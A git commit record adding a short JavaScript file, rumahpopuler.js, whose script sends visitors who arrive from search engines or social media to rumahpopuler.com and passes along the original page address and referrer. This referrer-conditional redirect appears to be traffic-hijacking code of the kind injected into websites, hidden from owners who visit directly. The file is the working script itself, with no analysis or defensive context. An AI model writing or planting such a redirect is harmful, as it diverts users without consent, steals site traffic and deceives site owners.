21684d878c32b2939c381c635fafa8fa85f78579
hunt3r6 <faisalmahadi126@gmail.com>
2022-12-18 11:17:47 +0700

    initial commit

---
+++ rumahpopuler.js
@@ -0,0 +1,5 @@
+<script>
+var ars = 'https://www.rumahpopuler.com/';
+
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+</script>
